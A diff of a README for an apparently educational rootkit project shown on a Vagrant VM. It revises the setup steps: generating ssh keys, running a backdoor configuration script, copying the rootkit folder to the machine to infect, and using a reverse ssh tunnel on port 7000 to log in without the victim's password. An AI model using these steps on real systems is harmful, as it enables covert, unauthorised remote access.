@@ -26,9 +26,10 @@ For own computer connecting to rootkit back door:
 
 
 ### <u>Configuration before installing rootkit</u>
-1. Make sure python is installed, and run `python backdoor_config.py` to set up file with your username, a public ssh rsa key, and public ip address. This will be used by the rootkit to set up an ssh backdoor so you can connect to the infected machine. This script will generate a new ssh rsa key pair called `rootkit_rsa` and `rootkit_rsa.pub` in the same directory as your rootkit file and `backdoor_config.py`.
-2. Move the `backdoor_config.txt` file into the `rootkit` folder.
-3. ONLY MOVE THE **rootkit** FOLDER TO THE MACHINE YOU WANT TO INFECT
+1. You need to generate an ssh rsa keypair. To do this run `ssh-keygen` and hit the *enter* key every time you are prompted for input. If you already have `~/.ssh/id_rsa` and `~/.ssh/id_rsa.pub`, make sure that your user has read write access (can check this through `ls -l ~/.ssh`). If your user doesn't have access (i.e. it says `root` instead), then remove these current keys (may need to do `sudo rm...`) and then run `ssh-keygen` **without `sudo`**.
+2. Make sure python is installed, and run `python backdoor_config.py` to set up file with your username, public ssh rsa key, and public ip address. This will be used by the rootkit to set up an ssh backdoor so you can connect to the infected machine. 
+3. Move the `backdoor_config.txt` file into the `rootkit` folder.
+4. ONLY MOVE THE **rootkit** FOLDER TO THE MACHINE YOU WANT TO INFECT
 
 
 ### <u>Booting Vagrant</u>
@@ -47,5 +48,5 @@ In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 1
 ### <u>Using backdoor</u>
 1. Whilst you have access to the system you are infecting, run the command `whoami` and make a note of the result that is produced. We will need this to ssh into the system
 2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
-3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000 -i <PATH TODIRECTORY WITH rootkit_rsa KEYPAIR IN>/rootkit_rsa` and you will have access to their system without the need for their password
+3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000` and you will have access to their system without the need for their password
 
